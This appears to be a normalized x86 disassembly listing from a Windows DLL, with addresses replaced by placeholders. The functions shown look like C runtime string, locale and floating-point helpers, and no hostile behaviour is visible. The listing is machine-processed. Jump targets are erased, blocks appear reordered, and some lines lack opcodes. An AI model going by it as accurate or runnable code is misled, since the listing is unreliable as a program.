cmp [ ebp + 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_1000d4aa
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100026a8
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_1000d4f1
add esp 0x18
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_100063a9
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_100063a9
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10008c8a
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
cmp ecx ebx
mov [ ebp - 0x8 ] ecx
je r-xdata
push eax
call sub_100033fd
cmp eax ebx
pop ecx
je r-xdata
call sub_1000d6b0
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_10008c10
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_1000d4f1
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_100033fd
cmp eax ebx
pop ecx
je r-xdata
call sub_1000d6b0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_10008c8a
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_10008c8a
pop ecx
cmp [ ebp + 0x1c ] ebx
push ebx
push ebx
jne r-xdata
push eax
call sub_100033fd
cmp eax ebx
pop ecx
je r-xdata
call sub_1000d6b0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10009047
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10008ca5
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000908a
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x8 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_1000d4aa
cmp eax 0xffffffff
pop ecx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100026a8
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
cmp esi ebx
mov edi eax
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_1000d4f1
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_100063a9
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10008c10
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10008c8a
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_100033fd
cmp eax ebx
pop ecx
je r-xdata
call sub_1000d6b0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10009242
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100027e4
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000908a
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10009282
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
call sub_100063a9
push [ esi + 0x8 ]
call sub_100063a9
push [ esi + 0xc ]
call sub_100063a9
push [ esi + 0x10 ]
call sub_100063a9
push [ esi + 0x14 ]
call sub_100063a9
push [ esi + 0x18 ]
call sub_100063a9
push [ esi ]
call sub_100063a9
push [ esi + 0x20 ]
call sub_100063a9
push [ esi + 0x24 ]
call sub_100063a9
push [ esi + 0x28 ]
call sub_100063a9
push [ esi + 0x2c ]
call sub_100063a9
push [ esi + 0x30 ]
call sub_100063a9
push [ esi + 0x34 ]
call sub_100063a9
push [ esi + 0x1c ]
call sub_100063a9
push [ esi + 0x38 ]
call sub_100063a9
push [ esi + 0x3c ]
call sub_100063a9
add esp 0x40
push [ esi + 0x40 ]
call sub_100063a9
push [ esi + 0x44 ]
call sub_100063a9
push [ esi + 0x48 ]
call sub_100063a9
push [ esi + 0x4c ]
call sub_100063a9
push [ esi + 0x50 ]
call sub_100063a9
push [ esi + 0x54 ]
call sub_100063a9
push [ esi + 0x58 ]
call sub_100063a9
push [ esi + 0x5c ]
call sub_100063a9
push [ esi + 0x60 ]
call sub_100063a9
push [ esi + 0x64 ]
call sub_100063a9
push [ esi + 0x68 ]
call sub_100063a9
push [ esi + 0x6c ]
call sub_100063a9
push [ esi + 0x70 ]
call sub_100063a9
push [ esi + 0x74 ]
call sub_100063a9
push [ esi + 0x78 ]
call sub_100063a9
push [ esi + 0x7c ]
call sub_100063a9
add esp 0x40
push [ esi + 0x80 ]
call sub_100063a9
push [ esi + 0x84 ]
call sub_100063a9
push [ esi + 0x88 ]
call sub_100063a9
push [ esi + 0x8c ]
call sub_100063a9
push [ esi + 0x90 ]
call sub_100063a9
push [ esi + 0x94 ]
call sub_100063a9
push [ esi + 0x98 ]
call sub_100063a9
push [ esi + 0x9c ]
call sub_100063a9
push [ esi + 0xa0 ]
call sub_100063a9
push [ esi + 0xa4 ]
call sub_100063a9
push [ esi + 0xa8 ]
call sub_100063a9
add esp 0x2c
sub_10009412
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
push esi
call sub_100063a9
pop ecx
sub_10009452
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100063a9
pop ecx
push esi
call sub_100063a9
pop ecx
sub_100094db
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
call sub_100049cb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_100049cb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000496c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10009550
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10009596
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push edi
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_100049cb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_100049cb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000496c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10009649
mov ecx [ esp + 0x4 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
je r-xdata
call sub_100049cb
push 0x16
pop esi
mov [ eax ] esi
mov edi [ esp + 0x14 ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ esp + 0x18 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_100049cb
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000496c
add esp 0x14
mov eax esi
jmp r-xdata
sub_100096b0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100096f0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
